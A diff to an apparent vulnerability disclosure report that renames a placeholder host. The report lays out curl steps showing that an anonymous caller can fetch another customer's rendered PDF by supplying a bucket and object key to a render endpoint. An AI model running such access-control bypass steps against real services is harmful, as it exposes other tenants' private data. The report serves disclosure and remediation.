@@ -12,7 +12,7 @@ category: Disclosure & Reporting Formats
 
 **CVSS:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (7.5)
 
-**Asset:** POST https://export.ridgeline.example/api/v2/render
+**Asset:** POST https://export.acme.example/api/v2/render
 
 ---
 
@@ -24,7 +24,7 @@ An anonymous caller reads any customer's previously rendered PDF report by pairi
 
 1. [attacker] Register a free trial account (Customer A, self-service, no verification) and render a report with attacker-supplied HTML:
 ```
-curl -s -D - -o /dev/null -X POST https://export.ridgeline.example/api/v2/render \
+curl -s -D - -o /dev/null -X POST https://export.acme.example/api/v2/render \
   -H "Authorization: Bearer $CUSTOMER_A_TOKEN" \
   -d 'html=<h1>VIGILMARK</h1>'
 ```
@@ -36,7 +36,7 @@ curl -s '<location from step 1>' -o out.pdf && pdftotext out.pdf -
 **Expect:** `VIGILMARK`.
 3. [attacker] Call the render endpoint again, anonymously this time, passing the same key explicitly instead of `html`:
 ```
-curl -s -D - -o /dev/null -X POST https://export.ridgeline.example/api/v2/render \
+curl -s -D - -o /dev/null -X POST https://export.acme.example/api/v2/render \
   --data-urlencode 'bucket=amzn-s3-demo-vigil-render-cache' \
   --data-urlencode "object_key=<key from step 1>"
 ```
@@ -48,7 +48,7 @@ curl -s '<location from step 3>' -o out2.pdf && pdftotext out2.pdf -
 **Expect:** `VIGILMARK` again — the bucket/key path needs no session either.
 5. [attacker] Repeat step 3 with `object_key` set to a value that was never minted:
 ```
-curl -s -o /dev/null -w '%{http_code}\n' -X POST https://export.ridgeline.example/api/v2/render \
+curl -s -o /dev/null -w '%{http_code}\n' -X POST https://export.acme.example/api/v2/render \
   --data-urlencode 'bucket=amzn-s3-demo-vigil-render-cache' \
   --data-urlencode 'object_key=vigil-no-such-object'
 ```
@@ -61,14 +61,14 @@ curl -s -o /dev/null -w '%{http_code}\n' \
 **Expect:** 403.
 7. [attacker] Register a second, unrelated trial account (Customer B) and render a report the same way as step 1:
 ```
-curl -s -D - -o /dev/null -X POST https://export.ridgeline.example/api/v2/render \
+curl -s -D - -o /dev/null -X POST https://export.acme.example/api/v2/render \
   -H "Authorization: Bearer $CUSTOMER_B_TOKEN" \
   -d 'html=<h1>CUSTOMERB-INVOICE-TOTAL-4820.75</h1>'
 ```
 **Expect:** 302, a second UUID key.
 8. [attacker] With no session, cookie, or `Authorization` header, call the render endpoint with Customer B's key from step 7:
 ```
-curl -s -D - -o /dev/null -X POST https://export.ridgeline.example/api/v2/render \
+curl -s -D - -o /dev/null -X POST https://export.acme.example/api/v2/render \
   --data-urlencode 'bucket=amzn-s3-demo-vigil-render-cache' \
   --data-urlencode "object_key=<key from step 7>"
 ```
